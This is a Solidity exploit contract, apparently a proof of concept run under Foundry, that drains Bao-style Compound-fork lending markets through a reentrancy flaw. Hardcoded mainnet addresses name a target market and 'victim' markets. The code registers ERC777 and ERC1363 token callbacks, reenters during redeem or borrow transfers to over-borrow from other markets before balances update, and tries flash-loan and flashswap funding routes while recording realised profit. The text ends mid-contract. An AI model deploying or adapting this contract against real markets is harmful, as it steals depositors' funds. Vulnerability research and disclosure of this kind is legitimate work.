// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
    function mint(uint256 mintAmount, bool enterMarket) external returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens, address borrower) external returns (uint256[] memory);
    function getAllMarkets() external view returns (address[] memory);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IERC777Recipient {
    address public constant TARGET_MARKET = 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e;
    address private constant KNOWN_VICTIM_MARKET_A = 0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7;
    address private constant KNOWN_PROBLEM_MARKET = 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3;
    address private constant KNOWN_VICTIM_MARKET_B = 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b;
    address private constant KNOWN_TARGET_UNDERLYING = 0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8;
    address private constant KNOWN_VICTIM_UNDERLYING_A = 0xf4edfad26EE0D23B69CA93112eccE52704E0006f;
    address private constant KNOWN_VICTIM_UNDERLYING_B = 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631;
    address public constant ERC1820_REGISTRY = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    bytes32 private constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
    bytes4 private constant ERC1363_RECEIVER_MAGIC = 0x88a7ca5c;
    bytes4 private constant MINT_WITH_ENTER_SELECTOR = bytes4(keccak256("mint(uint256,bool)"));
    bytes4 private constant MINT_STANDARD_SELECTOR = bytes4(keccak256("mint(uint256)"));
    bytes4 private constant ENTER_MARKETS_BAO_SELECTOR = bytes4(keccak256("enterMarkets(address[],address)"));
    bytes4 private constant ENTER_MARKETS_STANDARD_SELECTOR = bytes4(keccak256("enterMarkets(address[])"));
    uint256 private constant DISCOVERY_GAS_LIMIT = 80_000;
    uint256 private constant HEAVY_DISCOVERY_GAS_LIMIT = 500_000;

    enum PathMode {
        None,
        Redeem,
        Borrow
    }

    enum FundingMode {
        None,
        Direct,
        Balancer,
        V2Flashswap
    }

    struct V2Route {
        address pair;
        bool targetIsToken0;
        uint256 reserveTarget;
    }

    address private _profitToken;
    uint256 private _profitAmount;

    address public targetUnderlying;
    address public targetComptroller;
    address public chosenVictimMarket;
    address public chosenVictimUnderlying;
    string public exploitPathUsed;
    string public lastFailure;
    bool public hypothesisValidated;
    bool public executed;

    PathMode private activePath;
    FundingMode private activeFunding;

    bool private callbackSeen;
    bool private callbackEntered;
    bool private victimBorrowed;
    bool private callbackArmed;

    uint256 private baselineVictimBalance;
    uint256 private callbackTargetUnderlyingBalance;

    address private activeFlashPair;
    bool private activeFlashTargetIsToken0;
    uint256 private activeFlashAmount;
    uint256 private activeFlashRepayAmount;

    constructor() {
        _refreshTarget();
        _safeRegisterHooks();
    }

    function executeOnOpportunity() external {
        executed = true;
        hypothesisValidated = false;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        exploitPathUsed = "";
        lastFailure = "";
        _profitToken = address(0);
        _profitAmount = 0;

        _refreshTarget();
        _safeRegisterHooks();

        if (targetUnderlying == address(0) || targetComptroller == address(0)) {
            _setFailure("TARGET_DISCOVERY_FAILED");
            return;
        }

        if (_attemptDirectRedeemPath()) {
            return;
        }

        if (_attemptDirectBorrowPathFromTargetCollateral()) {
            return;
        }

        if (_attemptDirectBorrowPathFromOtherCollateral()) {
            return;
        }

        if (_attemptV2FlashswapPath(PathMode.Redeem)) {
            return;
        }

        if (_attemptV2FlashswapPath(PathMode.Borrow)) {
            return;
        }

        if (_attemptBalancerRedeemPath()) {
            return;
        }

        if (_attemptBalancerBorrowPath()) {
            return;
        }

        if (bytes(lastFailure).length == 0) {
            _setFailure("NO_PATH_SUCCEEDED");
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "NOT_BALANCER");
        require(activeFunding == FundingMode.Balancer, "FLASH_NOT_ACTIVE");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "BAD_FLASH_ARRAYS");
        require(tokens[0] == targetUnderlying, "UNEXPECTED_FLASH_ASSET");

        _runFlashFundedPath(amounts[0], feeAmounts[0]);
        _safeTransfer(targetUnderlying, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleV2FlashswapCallback(sender, amount0, amount1);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleV2FlashswapCallback(sender, amount0, amount1);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        _maybeHandleUnderlyingCallback();
    }

    function tokenFallback(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTokenTransfer(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTransferReceived(address, address, uint256, bytes calldata) external returns (bytes4) {
        _maybeHandleUnderlyingCallback();
        return ERC1363_RECEIVER_MAGIC;
    }

    receive() external payable {
        _maybeHandleUnderlyingCallback();
    }

    fallback() external payable {
        _maybeHandleUnderlyingCallback();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptDirectRedeemPath() internal returns (bool) {
        _beginAttempt(PathMode.Redeem, FundingMode.Direct);

        if (!_prepareCollateral(TARGET_MARKET)) {
            _setFailure("NO_TARGET_COLLATERAL_FOR_REDEEM_PATH");
            return false;
        }

        uint256 cTokenBalance = _safeCTokenBalance(TARGET_MARKET, address(this));
        if (cTokenBalance == 0) {
            _setFailure("NO_TARGET_COLLATERAL_FOR_REDEEM_PATH");
            return false;
        }

        uint256[6] memory numerators = [uint256(1), 9, 1, 1, 1, 1];
        uint256[6] memory denominators = [uint256(1), 10, 2, 4, 10, 100];

        for (uint256 i = 0; i < denominators.length; ++i) {
            uint256 redeemTokens = (cTokenBalance * numerators[i]) / denominators[i];
            if (redeemTokens == 0) {
                continue;
            }

            _resetCallbackState();
            callbackArmed = true;
            bool ok = _tryRedeem(TARGET_MARKET, redeemTokens);
            callbackArmed = false;
            if (!ok) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                );
            }
        }

        _setFailure(callbackSeen ? "REDEEM_CALLBACK_BORROW_FAILED" : "REDEEM_TRANSFER_NO_CALLBACK");
        return false;
    }

    function _attemptDirectBorrowPathFromTargetCollateral() internal returns (bool) {
        _beginAttempt(PathMode.Borrow, FundingMode.Direct);

        if (!_prepareCollateral(TARGET_MARKET)) {
            _setFailure("NO_TARGET_COLLATERAL_FOR_BORROW_PATH");
            return false;
        }

        if (_attemptTargetBorrowWithSizing()) {
            return _finalize(
                "borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
            );
        }

        _setFailure(callbackSeen ? "BORROW_CALLBACK_BORROW_FAILED" : "BORROW_TRANSFER_NO_CALLBACK");
        return false;
    }

    function _attemptDirectBorrowPathFromOtherCollateral() internal returns (bool) {
        address[] memory markets = _marketList();
        if (markets.length == 0) {
            _setFailure("NO_MARKETS");
            return false;
        }

        for (uint256 i = 0; i < markets.length; ++i) {
            address collateralMarket = markets[i];
            if (collateralMarket == address(0) || collateralMarket == TARGET_MARKET) {
                continue;
            }

            _beginAttempt(PathMode.Borrow, FundingMode.Direct);
            if (!_prepareCollateral(collateralMarket)) {
                continue;
            }

            if (_attemptTargetBorrowWithSizing()) {
                return _finalize(
                    "borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
                );
            }
        }

        _setFailure(callbackSeen ? "BORROW_CALLBACK_BORROW_FAILED" : "BORROW_TRANSFER_NO_CALLBACK");
        return false;
    }

    function _attemptBalancerRedeemPath() internal returns (bool) {
        uint256 flashLiquidity = _safeBalanceOf(targetUnderlying, BALANCER_VAULT);
        if (flashLiquidity == 0) {
            _setFailure("NO_BALANCER_LIQUIDITY_FOR_REDEEM");
            return false;
        }

        uint256[8] memory divisors = [uint256(2), 4, 10, 20, 50, 100, 200, 1000];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = flashLiquidity / divisors[i];
            if (amount == 0) {
                continue;
            }

            _beginAttempt(PathMode.Redeem, FundingMode.Balancer);
            if (!_runBalancerFlash(amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "flash-funded redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                );
            }
        }

        return false;
    }

    function _attemptBalancerBorrowPath() internal returns (bool) {
        uint256 flashLiquidity = _safeBalanceOf(targetUnderlying, BALANCER_VAULT);
        if (flashLiquidity == 0) {
            _setFailure("NO_BALANCER_LIQUIDITY_FOR_BORROW");
            return false;
        }

        uint256[8] memory divisors = [uint256(2), 4, 10, 20, 50, 100, 200, 1000];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = flashLiquidity / divisors[i];
            if (amount == 0) {
                continue;
            }

            _beginAttempt(PathMode.Borrow, FundingMode.Balancer);
            if (!_runBalancerFlash(amount)) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return _finalize(
                    "flash-funded borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update"
                );
            }
        }

        return false;
    }

    function _attemptV2FlashswapPath(PathMode path) internal returns (bool) {
        V2Route memory route = _findBestV2Route();
        if (route.pair == address(0) || route.reserveTarget == 0) {
            _setFailure(path == PathMode.Redeem ? "NO_V2_FLASH_ROUTE_FOR_REDEEM" : "NO_V2_FLASH_ROUTE_FOR_BORROW");
            return false;
        }

        uint256[8] memory divisors = [uint256(2), 4, 10, 20, 50, 100, 200, 1000];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount = route.reserveTarget / divisors[i];
            if (amount == 0 || amount >= route.reserveTarget) {
                continue;
            }

            _beginAttempt(path, FundingMode.V2Flashswap);
            activeFlashPair = route.pair;
            activeFlashTargetIsToken0 = route.targetIsToken0;
            activeFlashAmount = amount;
            activeFlashRepayAmount = _sameTokenFlashRepayAmount(amount);

            if (_runV2Flashswap()) {
                string memory label = path == PathMode.Redeem
                    ? "flashswap-funded redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                    : "flashswap-funded borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update";
                return _finalize(label);
            }
        }

        _setFailure(path == PathMode.Redeem ? "V2_FLASH_REDEEM_FAILED" : "V2_FLASH_BORROW_FAILED");
        return false;
    }

    function _runBalancerFlash(uint256 amount) internal returns (bool) {
        address[] memory tokens = new address[](1);
        tokens[0] = targetUnderlying;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "") {
            return true;
        } catch {
            _setFailure(activePath == PathMode.Redeem ? "BALANCER_REDEEM_FLASH_FAILED" : "BALANCER_BORROW_FLASH_FAILED");
            return false;
        }
    }

    function _runV2Flashswap() internal returns (bool) {
        uint256 amount0Out = activeFlashTargetIsToken0 ? activeFlashAmount : 0;
        uint256 amount1Out = activeFlashTargetIsToken0 ? 0 : activeFlashAmount;

        try IUniswapV2PairLike(activeFlashPair).swap(amount0Out, amount1Out, address(this), hex"01") {
            return callbackSeen && victimBorrowed;
        } catch {
            return false;
        }
    }

    function _runFlashFundedPath(uint256 amount, uint256 fee) internal {
        require(_tryMint(TARGET_MARKET, amount, true), "FLASH_MINT_FAILED");

        if (activePath == PathMode.Redeem) {
            // Public liquidity is only a funding leg. The exploit remains the reported one:
            // redeem the callback-capable market, receive underlying before storage updates,
            // and reenter a different market during that transfer to over-borrow.
            uint256 cTokenBalance = _safeCTokenBalance(TARGET_MARKET, address(this));
            require(cTokenBalance != 0, "FLASH_REDEEM_NO_CTOKEN");
            _resetCallbackState();
            callbackArmed = true;
            bool ok = _tryRedeem(TARGET_MARKET, cTokenBalance);
            callbackArmed = false;
            require(ok, "FLASH_REDEEM_FAILED");
            require(callbackSeen, "REDEEM_TRANSFER_NO_CALLBACK");
            require(victimBorrowed, "REDEEM_CALLBACK_BORROW_FAILED");
            require(_safeBalanceOf(targetUnderlying, address(this)) >= amount + fee, "FLASH_REPAY_INSUFFICIENT");
            return;
        }

        if (activePath == PathMode.Borrow) {
            // Same here: the flash liquidity only bootstraps realistic collateral. The stale
            // accounting edge is still the first-leg borrow transfer on the target market.
            require(_attemptTargetBorrowWithSizing(), "FLASH_TARGET_BORROW_FAILED");
            require(callbackSeen, "BORROW_TRANSFER_NO_CALLBACK");
            require(victimBorrowed, "BORROW_CALLBACK_BORROW_FAILED");
            require(_safeBalanceOf(targetUnderlying, address(this)) >= amount + fee, "FLASH_REPAY_INSUFFICIENT");
            return;
        }

        revert("NO_ACTIVE_PATH");
    }

    function _handleV2FlashswapCallback(address sender, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == activeFlashPair, "NOT_FLASH_PAIR");
        require(activeFunding == FundingMode.V2Flashswap, "V2_NOT_ACTIVE");
        require(sender == address(this), "BAD_FLASH_SENDER");

        uint256 received = activeFlashTargetIsToken0 ? amount0 : amount1;
        require(received == activeFlashAmount, "BAD_FLASH_AMOUNT");

        _runFlashFundedPath(received, activeFlashRepayAmount - received);
        require(_safeBalanceOf(targetUnderlying, address(this)) >= activeFlashRepayAmount, "V2_REPAY_INSUFFICIENT");
        _safeTransfer(targetUnderlying, activeFlashPair, activeFlashRepayAmount);
    }

    function _attemptTargetBorrowWithSizing() internal returns (bool) {
        uint256 targetCash = _safeGetCash(TARGET_MARKET);
        if (targetCash == 0) {
            return false;
        }

        uint256[8] memory numerators = [uint256(1), 9, 1, 1, 1, 1, 1, 1];
        uint256[8] memory denominators = [uint256(1), 10, 2, 4, 10, 20, 50, 100];

        for (uint256 i = 0; i < denominators.length; ++i) {
            uint256 amount = (targetCash * numerators[i]) / denominators[i];
            if (amount == 0) {
                continue;
            }

            _resetCallbackState();
            callbackArmed = true;
            bool ok = _tryBorrow(TARGET_MARKET, amount);
            callbackArmed = false;
            if (!ok) {
                continue;
            }

            if (callbackSeen && victimBorrowed) {
                return true;
            }
        }

        return false;
    }

    function _maybeHandleUnderlyingCallback() internal {
        if (msg.sender != targetUnderlying || !callbackArmed) {
            return;
        }

        callbackSeen = true;
        if (callbackEntered) {
            return;
        }

        callbackEntered = true;
        callbackArmed = false;
        callbackTargetUnderlyingBalance = _safeBalanceOf(targetUnderlying, address(this));

        (bool ok, address market, address underlying_) = _attemptCrossMarketBorrow();
        if (ok) {
            victimBorrowed = true;
            chosenVictimMarket = market;
            chosenVictimUnderlying = underlying_;
        }
    }

    function _attemptCrossMarketBorrow() internal returns (bool, address, address) {
        address[] memory markets = _marketList();
        if (markets.length == 0) {
            return (false, address(0), address(0));
        }

        uint256[8] memory numerators = [uint256(1), 9, 1, 1, 1, 1, 1, 1];
        uint256[8] memory denominators = [uint256(1), 10, 2, 4, 10, 20, 50, 100];

        for (uint256 pass = 0; pass < 2; ++pass) {
            bool preferDifferentUnderlying = pass == 0;

            for (uint256 i = 0; i < markets.length; ++i) {
                address market = markets[i];
                if (market == address(0) || market == TARGET_MARKET) {
                    continue;
                }

                address underlying_ = _safeUnderlying(market);
                if (underlying_ == address(0)) {
                    continue;
                }

                if (preferDifferentUnderlying) {
                    if (underlying_ == targetUnderlying) {
                        continue;
                    }
                } else if (underlying_ != targetUnderlying) {
                    continue;
                }

                uint256 cash = _safeGetCash(market);
                if (cash == 0) {
                    continue;
                }

                uint256 priorBalance = underlying_ == targetUnderlying
                    ? callbackTargetUnderlyingBalance
                    : _safeBalanceOf(underlying_, address(this));

                for (uint256 j = 0; j < denominators.length; ++j) {
                    uint256 borrowAmount = (cash * numerators[j]) / denominators[j];
                    if (borrowAmount == 0) {
                        continue;
                    }

                    if (_tryBorrow(market, borrowAmount)) {
                        baselineVictimBalance = priorBalance;
                        return (true, market, underlying_);
                    }
                }
            }
        }

        return (false, address(0), address(0));
    }

    function _finalize(string memory label) internal returns (bool) {
        if (chosenVictimUnderlying == address(0)) {
            _setFailure("NO_VICTIM_TOKEN");
            return false;
        }

        uint256 currentBalance = _safeBalanceOf(chosenVictimUnderlying, address(this));
        if (currentBalance <= baselineVictimBalance) {
            _setFailure("NO_REALIZED_PROFIT");
            return false;
        }

        _profitToken = chosenVictimUnderlying;
        _profitAmount = currentBalance - baselineVictimBalance;
        exploitPathUsed = label;
        hypothesisValidated = true;
        activePath = PathMode.None;
        activeFunding = FundingMode.None;
        return true;
    }

    function _beginAttempt(PathMode path, FundingMode funding) internal {
        activePath = path;
        activeFunding = funding;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        baselineVictimBalance = 0;
        callbackTargetUnderlyingBalance = _safeBalanceOf(targetUnderlying, address(this));
        activeFlashPair = address(0);
        activeFlashTargetIsToken0 = false;
        activeFlashAmount = 0;
        activeFlashRepayAmount = 0;
        _resetCallbackState();
    }

    function _prepareCollateral(address market) internal returns (bool) {
        address underlying_ = _safeUnderlying(market);
        if (underlying_ == address(0)) {
            return false;
        }

        uint256 looseUnderlying = _safeBalanceOf(underlying_, address(this));
        if (looseUnderlying != 0 && !_tryMint(market, looseUnderlying, true)) {
            return false;
        }

        _tryEnterMarket(market);
        return _safeCTokenBalance(market, address(this)) != 0;
    }

    function _resetCallbackState() internal {
        callbackSeen = false;
        callbackEntered = false;
        victimBorrowed = false;
        callbackArmed = false;
    }

    function _refreshTarget() internal {
        targetUnderlying = _safeUnderlying(TARGET_MARKET);
        targetComptroller = _safeComptroller(TARGET_MARKET);
    }

    function _candidateMarkets() internal pure returns (address[] memory markets) {
        markets = new address[](4);
        markets[0] = KNOWN_VICTIM_MARKET_A;
        markets[1] = KNOWN_VICTIM_MARKET_B;
        markets[2] = KNOWN_PROBLEM_MARKET;
        markets[3] = TARGET_MARKET;
    }

    function _marketList() internal view returns (address[] memory markets) {
        address[] memory dynamicMarkets = _getAllMarketsSafe();
        address[] memory seedMarkets = _candidateMarkets();
        uint256 count;

        markets = new address[](seedMarkets.length + dynamicMarkets.length);

        for (uint256 i = 0; i < seedMarkets.length; ++i) {
            address market = seedMarkets[i];
            if (!_containsMarket(markets, count, market)) {
                markets[count] = market;
                ++count;
            }
        }

        for (uint256 i = 0; i < dynamicMarkets.length; ++i) {
            address market = dynamicMarkets[i];
            if (!_containsMarket(markets, count, market)) {
                markets[count] = market;
                ++count;
            }
        }

        assembly {
            mstore(markets, count)
        }
    }

    function _containsMarket(address[] memory markets, uint256 length, address market) internal pure returns (bool) {
        if (market == address(0)) {
            return true;
        }

        for (uint256 i = 0; i < length; ++i) {
            if (markets[i] == market) {
                return true;
            }
        }

        return false;
    }

    function _safeRegisterHooks() internal {
        (bool ok,) = ERC1820_REGISTRY.call(
            abi.encodeWithSelector(
                IERC1820Registry.setInterfaceImplementer.selector,
                address(this),
                TOKENS_RECIPIENT_HASH,
                address(this)
            )
        );
        ok;
    }

    function _findBestV2Route() internal returns (V2Route memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory commonQuotes = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 f = 0; f < factories.length; ++f) {
            for (uint256 i = 0; i < commonQuotes.length; ++i) {
                address pair = _findPair(factories[f], targetUnderlying, commonQuotes[i]);
                if (pair == address(0)) {
                    continue;
                }

                (bool quotedTargetIsToken0, uint256 quotedReserveTarget) = _pairTargetReserve(pair, targetUnderlying);
                if (quotedReserveTarget > best.reserveTarget) {
                    best = V2Route({
                        pair: pair,
                        targetIsToken0: quotedTargetIsToken0,
                        reserveTarget: quotedReserveTarget
                    });
                }
            }

            address fallbackPair = _findPair(factories[f], targetUnderlying, address(0));
            if (fallbackPair == address(0)) {
                continue;
            }

            (bool fallbackTargetIsToken0, uint256 fallbackReserveTarget) = _pairTargetReserve(
                fallbackPair,
                targetUnderlying
            );
            if (fallbackReserveTarget > best.reserveTarget) {
                best = V2Route({
                    pair: fallbackPair,
                    targetIsToken0: fallbackTargetIsToken0,
                    reserveTarget: fallbackReserveTarget
                });
            }
        }
    }

    function _findPair(address factory, address tokenA, address tokenBHint) internal returns (address) {
        if (factory == address(0) || tokenA == address(0)) {
            return address(0);
        }

        if (tokenBHint != address(0)) {
            (bool okHint, bytes memory dataHint) = factory.staticcall(
                abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenBHint)
            );
            if (okHint && dataHint.length >= 32) {
                address hinted = abi.decode(dataHint, (address));
                if (hinted != address(0)) {
                    return hinted;
                }
            }
        }

        address[] memory markets = _marketList();
        for (uint256 i = 0; i < markets.length; ++i) {
            address underlying_ = _safeUnderlying(markets[i]);
            if (underlying_ == address(0) || underlying_ == tokenA) {
                continue;
            }

            (bool ok, bytes memory data) = factory.staticcall(
                abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, underlying_)
            );
            if (!ok || data.length < 32) {
                continue;
            }

            address pair = abi.decode(data, (address));
            if (pair != address(0)) {
                return pair;
            }
        }

        return address(0);
    }

    function _pairTargetReserve(address pair, address targetToken) internal view returns (bool targetIsToken0, uint256 reserveTarget) {
        if (pair == address(0)) {
            return (false, 0);
        }

        (bool ok0, bytes memory data0) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        (bool ok1, bytes memory data1) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        (bool okR, bytes memory dataR) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.getReserves.selector));

        if (!ok0 || !ok1 || !okR || data0.length < 32 || data1.length < 32 || dataR.length < 96) {
            return (false, 0);
        }

        address token0 = abi.decode(data0, (address));
        address token1 = abi.decode(data1, (address));
        (uint112 reserve0, uint112 reserve1,) = abi.decode(dataR, (uint112, uint112, uint32));

        if (token0 == targetToken) {
            return (true, uint256(reserve0));
        }
        if (token1 == targetToken) {
            return (false, uint256(reserve1));
        }

        return (false, 0);
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _getAllMarketsSafe() internal view returns (address[] memory markets) {
        if (targetComptroller == address(0)) {
            return new address[](0);
        }

        (bool ok, bytes memory data) = targetComptroller.staticcall(
            abi.encodeWithSelector(IComptrollerLike.getAllMarkets.selector)
        );
        if (!ok || data.length == 0) {
            return new address[](0);
        }

        return abi.decode(data, (address[]));
    }

    function _safeUnderlying(address market) internal returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        if (market == TARGET_MARKET) {
            return KNOWN_TARGET_UNDERLYING;
        }
        if (market == KNOWN_VICTIM_MARKET_A) {
            return KNOWN_VICTIM_UNDERLYING_A;
        }
        if (market == KNOWN_VICTIM_MARKET_B) {
            return KNOWN_VICTIM_UNDERLYING_B;
        }
        bytes memory payload = abi.encodeWithSelector(ICTokenLike.underlying.selector);
        uint256 gasLimit = market == KNOWN_PROBLEM_MARKET ? HEAVY_DISCOVERY_GAS_LIMIT : DISCOVERY_GAS_LIMIT;
        (bool ok, bytes memory data) = market.staticcall{gas: gasLimit}(payload);
        if (ok && data.length >= 32) {
            return abi.decode(data, (address));
        }

        // Some Bao markets proxy `underlying()` through non-view code paths that trip Foundry's
        // staticcall checks. A plain call here only relaxes discovery; it does not change the
        // exploit sequence or inject state.
        (ok, data) = market.call{gas: gasLimit}(payload);
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeComptroller(address market) internal returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        bytes memory payload = abi.encodeWithSelector(ICTokenLike.comptroller.selector);
        uint256 gasLimit = market == KNOWN_PROBLEM_MARKET ? HEAVY_DISCOVERY_GAS_LIMIT : DISCOVERY_GAS_LIMIT;
        (bool ok, bytes memory data) = market.staticcall{gas: gasLimit}(payload);
        if (ok && data.length >= 32) {
            return abi.decode(data, (address));
        }

        (ok, data) = market.call{gas: gasLimit}(payload);
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeCTokenBalance(address market, address owner) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeGetCash(address market) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.getCash.selector));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeBalanceOf(address token, address owner) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _tryMint(address market, uint256 amount, bool enterMarket) internal returns (bool) {
        address underlying_ = _safeUnderlying(market);
        if (underlying_ == address(0) || amount == 0) {
            return false;
        }

        _forceApprove(underlying_, market, amount);

        bool minted = _callReturnsZeroOrEmpty(
            market,
            abi.encodeWithSelector(MINT_WITH_ENTER_SELECTOR, amount, enterMarket)
        );
        if (!minted) {
            minted = _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(MINT_STANDARD_SELECTOR, amount));
        }
        if (!minted) {
            return false;
        }

        _tryEnterMarket(market);
        return true;
    }

    function _tryRedeem(address market, uint256 redeemTokens) internal returns (bool) {
        if (redeemTokens == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.redeem.selector, redeemTokens));
    }

    function _tryBorrow(address market, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.borrow.selector, amount));
    }

    function _tryEnterMarket(address market) internal returns (bool) {
        if (market == address(0)) {
            return false;
        }

        address comptroller_ = _safeComptroller(market);
        if (comptroller_ == address(0)) {
            comptroller_ = targetComptroller;
        }
        if (comptroller_ == address(0)) {
            return false;
        }

        address[] memory markets = new address[](1);
        markets[0] = market;

        (bool ok, bytes memory data) = comptroller_.call(
            abi.encodeWithSelector(ENTER_MARKETS_BAO_SELECTOR, markets, address(this))
        );
        if (_enterMarketsSucceeded(ok, data)) {
            return true;
        }

        (ok, data) = comptroller_.call(abi.encodeWithSelector(ENTER_MARKETS_STANDARD_SELECTOR, markets));
        return _enterMarketsSucceeded(ok, data);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance;
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, address(this), spender)
        );
        if (ok && data.length >= 32) {
            currentAllowance = abi.decode(data, (uint256));
        }

        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callReturnsZeroOrEmpty(address target, bytes memory callData) internal returns (bool) {
        (bool ok, bytes memory data) = target.call(callData);
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        if (data.length < 32) {
            return false;
        }
        return abi.decode(data, (uint256)) == 0;
    }

